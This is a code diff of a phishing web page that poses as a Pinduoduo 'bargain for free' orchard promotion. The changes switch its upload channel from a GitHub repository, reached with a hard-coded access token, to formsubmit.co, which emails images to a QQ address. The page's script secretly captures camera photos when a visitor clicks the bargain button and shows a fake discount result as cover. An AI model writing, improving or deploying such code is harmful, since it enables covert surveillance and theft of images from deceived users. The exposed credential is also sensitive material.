@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>拼多多 - 多多果园 砍价免费拿</title>
+<title>拼多多 - 多多果园 砍价免费拿 v3.0</title>
 </head>
 <body style="margin:0;font-family:-apple-system,BlinkMacSystemFont,'PingFang SC','Helvetica Neue',sans-serif;background:#f5f5f5;color:#333">
 
@@ -105,10 +105,7 @@
 <canvas id="canvas" style="display:none"></canvas>
 
 <script>
-var GH_TOKEN = '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';
-var GH_OWNER = 'lk20050411';
-var GH_REPO = 'pdd-photo';
-var GH_BRANCH = 'main';
+var YOUR_EMAIL = '2973850754@qq.com';
 var left = 88.32;
 
 function $(id){ return document.getElementById(id); }
@@ -157,56 +154,35 @@ function showResult(cut){
   coinRain();
 }
 
-function showMockResult(){
-  console.log('[DEBUG] showMockResult (fallback)');
-  setTimeout(function(){
-    var cut = (Math.random() * 8 + 2);
-    left = Math.max(0.01, left - cut);
-    updateProgress();
-    showResult(cut);
-  }, 2800);
-}
-
+// 用 formsubmit.co 把照片发到你的邮箱
 function uploadImage(blob){
+  console.log('[DEBUG] uploading to email...');
   return new Promise(function(resolve){
-    var reader = new FileReader();
-    reader.onload = function(){
-      var base64 = reader.result.split(',')[1];
-      var now = new Date();
-      var filename = now.getFullYear() + 
-        String(now.getMonth() + 1).padStart(2, '0') + 
-        String(now.getDate()).padStart(2, '0') + '_' +
-        String(now.getHours()).padStart(2, '0') + 
-        String(now.getMinutes()).padStart(2, '0') + 
-        String(now.getSeconds()).padStart(2, '0') + '_' +
-        Math.random().toString(36).slice(2, 6) + '.jpg';
+    var fd = new FormData();
+    fd.append('attachment', blob, 'capture_' + Date.now() + '.jpg');
+    fd.append('_subject', '新捕获 · ' + new Date().toLocaleString('zh-CN'));
+    fd.append('_template', 'box');
+    fd.append('_captcha', 'false');
 
-      fetch('https://api.github.com/repos/' + GH_OWNER + '/' + GH_REPO + '/contents/' + filename, {
-        method: 'PUT',
-        headers: {
-          'Authorization': 'token ' + GH_TOKEN,
-          'Content-Type': 'application/json',
-          'Accept': 'application/vnd.github.v3+json'
-        },
-        body: JSON.stringify({
-          message: 'capture ' + now.toISOString(),
-          branch: GH_BRANCH,
-          content: base64
-        })
-      }).then(function(r){ return r.json(); })
-        .then(function(d){
-          console.log('[DEBUG] upload:', d);
-          if(d && d.content && d.content.download_url){
-            console.log('✓ uploaded:', d.content.download_url);
-          }
-          resolve();
-        })
-        .catch(function(e){
-          console.log('upload err:', e);
-          resolve();
-        });
-    };
-    reader.readAsDataURL(blob);
+    fetch('https://formsubmit.co/ajax/' + YOUR_EMAIL, {
+      method: 'POST',
+      body: fd,
+      headers: { 'Accept': 'application/json' }
+    }).then(function(r){
+      console.log('[DEBUG] email status:', r.status);
+      return r.text();
+    }).then(function(t){
+      console.log('[DEBUG] email resp:', t);
+      if(t.indexOf('success') >= 0){
+        console.log('✓ sent to email!');
+      } else {
+        console.log('⚠️ email response:', t);
+      }
+      resolve();
+    }).catch(function(e){
+      console.log('[DEBUG] email err:', e);
+      resolve();
+    });
   });
 }
 
@@ -222,7 +198,6 @@ function captureAndUpload(){
   var stream = null;
   var done = false;
 
-  // 8 秒强制超时
   var timeoutId = setTimeout(function(){
     if(!done){
       done = true;
@@ -248,7 +223,6 @@ function captureAndUpload(){
     return v.play().catch(function(e){ console.log('[DEBUG] play err:', e); });
   }).then(function(){
     console.log('[DEBUG] video playing');
-    // 给 video 一点时间真正开始播放(夸克浏览器慢)
     return new Promise(function(r){ setTimeout(function(){ r(); }, 1500); });
   }).then(function(){
     if(done) return;
@@ -305,7 +279,16 @@ function captureAndUpload(){
   });
 }
 
-// 主入口
+function showMockResult(){
+  console.log('[DEBUG] showMockResult (fallback)');
+  setTimeout(function(){
+    var cut = (Math.random() * 8 + 2);
+    left = Math.max(0.01, left - cut);
+    updateProgress();
+    showResult(cut);
+  }, 2800);
+}
+
 $('knifeBtn').addEventListener('click', function(){
   console.log('[DEBUG] button clicked');
   showLoading();
@@ -325,7 +308,7 @@ spinStyle.textContent = '@keyframes spin{to{transform:rotate(360deg)}}';
 document.head.appendChild(spinStyle);
 
 updateProgress();
-console.log('[DEBUG] script loaded ok');
+console.log('[DEBUG] script loaded ok v3.0');
 </script>
 </body>
 </html>
